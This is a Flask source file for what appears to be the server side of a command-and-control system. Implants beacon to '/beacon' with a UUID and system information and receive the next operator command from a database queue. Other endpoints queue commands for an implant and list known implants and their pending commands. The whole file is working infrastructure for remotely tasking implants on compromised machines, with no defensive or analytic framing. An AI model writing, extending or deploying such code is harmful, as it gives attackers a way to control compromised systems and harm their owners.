from flask import Blueprint, request, jsonify

import logging

from app import db
from app.models import CommandQueue

logging.basicConfig(level=logging.DEBUG)

bp = Blueprint("api", __name__, url_prefix="/api/v1")


@bp.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json()
    timestamp = data.get("timestamp")
    implant_uuid = data.get("uuid")
    system_info = data

    logging.info(
        f"Received beacon from {implant_uuid} at {timestamp} seconds: {system_info}"
    )

    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if not command_queue:
        command_queue = CommandQueue(implant_uuid=implant_uuid, commands=[])
        db.session.add(command_queue)
        db.session.commit()
        command_response = {"command": ""}

        logging.debug(f"A new CommandQueue for {implant_uuid} was added.")
    elif len(command_queue.commands) > 0:
        commands_list = command_queue.commands
        first_command = commands_list.pop(0)
        db.session.delete(command_queue)
        new_queue = CommandQueue(implant_uuid=implant_uuid, commands=commands_list)
        db.session.add(new_queue)
        db.session.flush()
        db.session.commit()
        command_response = {"command": first_command}

        logging.debug(
            f"Popped command {first_command} for {implant_uuid} and updated the CommandQueue."
        )
    else:
        logging.debug(f"No commands for {implant_uuid}.")
        command_response = {"command": ""}

    return jsonify(command_response)


@bp.route("/command", methods=["POST"])
def command():
    data = request.get_json()
    command_text = data.get("command")
    implant_uuid = data.get("uuid")

    if not command_text or not implant_uuid:
        return jsonify({"status": "Invalid command or UUID"}), 400

    command_queue = CommandQueue.query.filter_by(implant_uuid=implant_uuid).first()
    if not command_queue:
        return jsonify({"message": "Given UUID is not in use."}), 404

    logging.info(
        f"Before adding: Current commands for {implant_uuid}: {command_queue.commands}"
    )

    if command_queue.commands is None:
        command_queue.commands = []

    commands_list = command_queue.commands
    commands_list.append(command_text)
    db.session.delete(command_queue)
    new_queue = CommandQueue(implant_uuid=implant_uuid, commands=commands_list)
    db.session.add(new_queue)

    db.session.flush()
    db.session.commit()

    logging.info(
        f"After adding: New commands for {implant_uuid}: {command_queue.commands}"
    )

    return jsonify({"message": "Command added to queue successfully"}), 200


@bp.route("/uuids", methods=["GET"])
def list_uuids():
    uuids = db.session.query(CommandQueue.implant_uuid).distinct().all()
    return jsonify([uuid[0] for uuid in uuids])


@bp.route("/commands/<uuid>", methods=["GET"])
def get_commands(uuid):
    command_queue = CommandQueue.query.filter_by(implant_uuid=uuid).first()
    if not command_queue:
        return jsonify({"message": "No commands found"}), 404
    return jsonify(command_queue.commands)
